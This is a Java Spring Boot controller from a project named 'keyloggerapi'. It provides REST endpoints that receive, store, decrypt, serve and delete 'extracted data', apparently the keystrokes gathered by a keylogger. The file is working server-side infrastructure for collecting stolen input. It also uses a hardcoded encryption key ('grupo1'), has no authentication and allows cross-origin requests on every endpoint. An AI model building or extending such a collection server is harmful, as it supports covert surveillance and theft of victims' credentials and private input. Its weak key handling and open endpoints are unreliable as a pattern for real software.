package com.grupo1.keyloggerapi.controllers;

import java.util.ArrayList;
import java.util.Optional;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.*;

import com.grupo1.keyloggerapi.models.ExtractedDataModel;
import com.grupo1.keyloggerapi.services.ExtractedDataService;
import com.grupo1.keyloggerapi.utilities.AESEncryptionDecryption;

@RestController
@RequestMapping("/data")
public class ExtractedDataController {
    @Autowired
    ExtractedDataService extractedDataService;
    private final String encryptationKey = "grupo1";
    private AESEncryptionDecryption cypher = new AESEncryptionDecryption();

    @CrossOrigin
    @GetMapping("all/query")
    public ArrayList<ExtractedDataModel> obtainAllData(@RequestParam("key") String privateKey) {
        ArrayList<ExtractedDataModel> result = extractedDataService.obtainData();
        for (int i = 0; i < result.size(); i++) {
            result.get(i).setData(cypher.decrypt(result.get(i).getData(), privateKey));
        }
        return result;
    }

    @CrossOrigin
    @PostMapping()
    public ExtractedDataModel saveData(@RequestBody ExtractedDataModel data) {
        data.setData(cypher.encrypt(data.getData(), encryptationKey));
        return this.extractedDataService.saveData(data);
    }

    @CrossOrigin
    @GetMapping("id/query")
    public Optional<ExtractedDataModel> obtainDataById(@RequestParam("id") long id,
            @RequestParam("key") String privateKey) {
        Optional<ExtractedDataModel> result = this.extractedDataService.obtainDataById(id);
        if (result.isPresent())
            result.get().setData(cypher.decrypt(result.get().getData(), privateKey));
        return result;
    }

    @CrossOrigin
    @DeleteMapping(path = "/{id}")
    public String deleteDataById(@PathVariable("id") Long id) {

        if (this.extractedDataService.obtainDataById(id).isPresent()) {
            this.extractedDataService.deleteDataById(id);
            return "Deleted data with id " + id;
        } else {
            return "Could not delete data with id " + id + " (probably id does not exist)";
        }
    }
}
